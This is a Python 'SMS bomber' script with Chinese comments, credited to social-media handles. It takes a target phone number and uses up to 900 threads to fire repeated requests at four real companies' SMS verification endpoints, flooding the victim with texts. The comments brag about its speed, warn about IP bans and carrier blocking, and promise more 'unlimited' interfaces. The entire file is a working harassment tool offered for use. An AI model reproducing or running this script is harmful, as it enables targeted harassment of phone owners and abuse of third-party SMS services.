print('程序制作者:@anchun_cn')
print('频道:@qq_cncom')
#'频道:@qq_cncom'😭
#使用过度会被封IP
#使用过度会被运营商拦截
#内测版   后续会增加多个无限制短信接口   #解除限制狂暴启动
#实际测试秒7+

import concurrent.futures
import requests
import time

def send_request(url, method, data=None, headers=None):
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers)
        elif method == 'POST':
            response = requests.post(url, json=data, headers=headers)
        response.raise_for_status() 
        print(f"Received response from {url}: {response.text}")
    except requests.RequestException as e:
        print(f"Error sending request to {url}: {e}")

def send_requests_for_interface(interface, repeat_times, phone):
    for _ in range(repeat_times):
        for _ in range(900): 
            send_request(interface["url"].format(phone=phone), interface["method"], interface["data"], interface.get("headers"))
            time.sleep(1 / 900)  
        time.sleep(1 - (_ / repeat_times) * (1 / 900))  

def main():
    phone = input("手机号：")
    total_rounds = int(input("请输入要重复整个请求发送过程的轮数（整数）："))
    repeat_times = int(input("请输入每轮发送请求的次数（整数）："))

    interfaces = [
          {
        "url": "https://ay.ecolovo.com/gateway/auth/smsCode?phone={phone}&appCode=HELPER",
        "method": "GET"
    },
    {
        "url": "https://factory.ecoaiya.com/api/auth/n/login/sms", 
        "method": "POST",
        "data": {"appCode":"APPLET","client":"WX_MP","mobile": phone}  
    },
    {
        "url": "https://mall.ecoaiya.com//api/auth/smsCode",
        "method": "POST",
        "data": {"appCode":"MALL","client":"MP","mobile": phone}
    },
     {
            "url": "https://dqstar2c.gdyjvip.com/star2cService/sms/sendCode?phone={phone}",
            "method": "POST",
            "data": {"phone": phone},   
            "headers": {
                "User-Agent": "Mozilla/6.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
            }
        }
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=900) as executor:
        for round_num in range(total_rounds):
            for interface in interfaces:
                executor.submit(send_requests_for_interface, interface, repeat_times, phone)

if __name__ == "__main__":
    main()
    
